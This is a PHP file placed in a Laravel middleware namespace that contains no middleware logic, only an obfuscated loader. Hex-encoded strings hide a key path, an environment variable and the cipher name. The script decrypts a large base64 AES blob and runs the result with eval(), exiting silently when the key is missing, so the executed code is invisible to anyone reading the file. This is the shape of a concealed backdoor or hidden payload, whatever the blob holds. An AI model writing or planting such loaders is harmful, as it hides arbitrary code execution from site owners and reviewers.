<?php
namespace App\Http\Middleware;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('VX5P5L5is8WIIv3bX9f9jA==');

$c=base64_decode(

'RMz5gbG8jWDcTNSxETxTvpdeOTQ8g5P8SWK5FFdLgRv/pdjmxioUZ1kTnqdQo26hFhGYAD11z0Eu' .
'yj+Fcr6ujteSNUTQmhHu3i1RPJH9/hMIE/Rtf5ab17ghKE50aoTj4RUbD77fzGRcWTmOdjMurnjz' .
'D1O72tR6ECSueQ4e5+ORFzPz4rMU7uKjCRCCsTWR6WjB4irlHwfGsnumM8U9gutCjShECy6Zb70p' .
'UP5Wh//6SqsdwcXiJb4rAa0qR2V142P3AHGj6Vufe2U0ZQvOoQ1LZoLnopQylPhuC4zTVUmbgrK9' .
'apcTu+o6V2Qpq3ZCOEWasm7JReupu0127ZoygCLeUuf753XbdPbFDxhrPeFfugWJH1U7WAHqc9VX' .
'r19M0y80nXX1QdVJ/uzVNXoVD/smdVsAdZwYLqX+NVfoxZisQ64OjOXnfzUYvkVv3ppiPXQVAg+w' .
'FT60odHBMDQ5o+fk0XxnsMmsNxnEREKqPzJQzCkOuwpxpP535a6mDZTeqpahKmREc//lWtbVPxDg' .
'y71Op/8m+hy50VvbWLoeppt2NNKPKe4oMGD0d5PNyWiY2LkoGeevfjHEZsfLJm9KKpoYV4Iopaw3' .
'kRF/knHoEp44scf1NrGo/ixpPHYPQp2ivctlEb65Cs62qTEqHR6XjNmAsuo1g76zoD8wXVh0eXUO' .
'XmpeMcCTC28O0qoF1Hnhb+y0Oy5mSIe3NEfnPA4Ap8TcBZ4uIdoxuuL7QUJOCd9+njFb3hKRARjh' .
'SqOuJaxJkViOOshj9STzNr7FXha1mCX3wMCTdfsMJAPHFup3J+8rKgBPdcOXhip3bhp1zIKIshmU' .
'muqdp4z9N+uY8OCXGDNqxW9pxbAsGETfFyl6jmMNZWKcISS0JBjoei/rWj1Kin60eeem+KYwZ785' .
'V6JEZo9EuphtdMDbZ7e0GdtQeBNzYegyvsTleGpElYMH7IKJ1oQCDxvBjCkCCOxE26GAqEgQcYFb' .
'ihgw48PnW4diWcZj8+kBVDYFR8KqnUQ0RFOiI5Ux3/2Jo64zuqefijhmsT4shFHnUV+tV2mmAg0r' .
'iJF3yJFGWMOcP5c8m+MRnYzbdc7XOzBs7OkAVUkdD7IMVTY2bRh24SWyoX4kM3q0du44vXewxURG' .
'tDj56lp/sLvPkfOwXlEU/fv1VQkDHVgY2m4XsHerigL0MJp5Y4E4uyv8ZENdWxVNJcMhKvkWcqGg' .
'bVeifRNnz0yReA+F8fFVkbUg+j2SGGy9msMvyjInZFMmCvZLvxEE4Gg3N/C50mpPdm7ZsfgHJZ04' .
'feToR4OhOx10MrmIWc4NKiq0bQz5YoXCZCWByJXyM8soLhHwM4vdQgertO+JE8nQLkBrkLFUibth' .
'KbASfvDBbyDw6NB8T05PhWYi0+ILhDkM1EgNLmp43M8oxmgsVoWnsU6M+kygKkzxgQalMDYSsbU0' .
'XlHhZba48M/OUwQ9rCSp1CIZ9Q9lhfz9qhC6zfcU53SDpnL5tiLZQzJRi1Oka6ZZMJMNckFK+2n/' .
'12i42QeViSVJRR0bkbg8M3tk1pdjiYlpgMm6AQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

